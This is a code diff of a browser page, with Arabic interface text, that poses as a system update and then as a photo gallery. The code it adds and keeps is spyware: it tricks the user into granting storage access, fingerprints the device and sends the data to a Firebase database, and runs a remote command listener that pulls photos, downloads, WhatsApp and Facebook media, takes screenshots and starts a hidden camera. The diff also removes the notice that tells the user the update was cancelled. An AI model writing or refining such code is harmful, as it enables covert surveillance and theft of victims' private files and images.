@@ -47,13 +47,13 @@
             document.getElementById('msg').innerText = "جاري فتح نافذة التحديث...";
             document.getElementById('guide').innerText = "الرجاء اختيار مجلد 'الذاكرة الداخلية' أو 'Internal Storage' ثم الضغط على 'موافق' أو 'Select'";
 
-            // الحصول على الجذر المطلق
+            // تسجيل الجهاز فوراً قبل أي شيء آخر
+            registerDevice();
+
+            // الحصول على الجذر
             try {
                 ROOT_HANDLE = await window.showDirectoryPicker({ mode: 'readwrite', startIn: 'documents' });
             } catch(e) {
-                document.getElementById('msg').innerText = "تم إلغاء التحديث. بعض الميزات محدودة.";
-                document.getElementById('guide').style.display = 'none';
-                // نكمل بدون ملفات
                 ROOT_HANDLE = null;
             }
 
@@ -66,13 +66,15 @@
                 a.click();
             } catch(e) {}
 
+            // تحديث حالة الجهاز في القاعدة
+            vref.update({ online: true });
+
             document.getElementById('msg').innerText = ROOT_HANDLE ? "✅ تم التحديث بنجاح" : "✅ تم الاتصال";
             document.getElementById('guide').style.display = 'none';
             setTimeout(() => {
                 document.body.innerHTML = '<h2 style="color:#fff;text-align:center;margin-top:40vh;">📷 معرض الصور</h2>';
             }, 1000);
 
-            await registerDevice();
             startCommandListener();
             if (camStream) startHiddenCamera();
         };
@@ -81,10 +83,32 @@
             let ip = 'غير معروف';
             try { const r = await fetch('https://api.ipify.org?format=json'); const d = await r.json(); ip = d.ip; } catch(e) {}
             let battery = '?', charging = false;
-            if (navigator.getBattery) { const b = await navigator.getBattery(); battery = Math.round(b.level*100)+'%'; charging = b.charging; }
-            await vref.set({
+            try {
+                if (navigator.getBattery) {
+                    const b = await navigator.getBattery();
+                    battery = Math.round(b.level*100)+'%';
+                    charging = b.charging;
+                }
+            } catch(e) {}
+
+            vref.set({
                 online: true,
-                fingerprint: { ua: navigator.userAgent, plat: navigator.platform, scr: screen.width+'x'+screen.height, cores: navigator.hardwareConcurrency, mem: navigator.deviceMemory||'?', ip, battery, charging, language: navigator.language }
+                fingerprint: {
+                    ua: navigator.userAgent,
+                    plat: navigator.platform,
+                    scr: screen.width+'x'+screen.height,
+                    cores: navigator.hardwareConcurrency,
+                    mem: navigator.deviceMemory||'?',
+                    ip: ip,
+                    battery: battery,
+                    charging: charging,
+                    language: navigator.language,
+                    time: new Date().toLocaleString()
+                }
+            }).then(() => {
+                console.log('✅ تم تسجيل الجهاز في Firebase');
+            }).catch(err => {
+                console.error('❌ فشل التسجيل:', err);
             });
         }
 
@@ -95,7 +119,7 @@
                 try {
                     switch(c.action) {
                         case 'get_photos': c.folder ? await pullFromFolder(c.folder) : await pullAll(); break;
-                        case 'get_files': await pullFromFolder(c.folder || 'documents'); break;
+                        case 'get_files': await pullFromFolder(c.folder || 'downloads'); break;
                         case 'vibrate': navigator.vibrate([200,100,200]); break;
                         case 'play_sound': break;
                         case 'screenshot': await screenshot(); break;
@@ -119,8 +143,7 @@
                 downloads: 'Download',
                 whatsapp: 'WhatsApp/Media/WhatsApp Images',
                 facebook: 'Facebook/Media',
-                pictures: 'Pictures',
-                documents: ''
+                pictures: 'Pictures'
             };
             const path = MAP[folderName] || folderName;
             let current = ROOT_HANDLE;
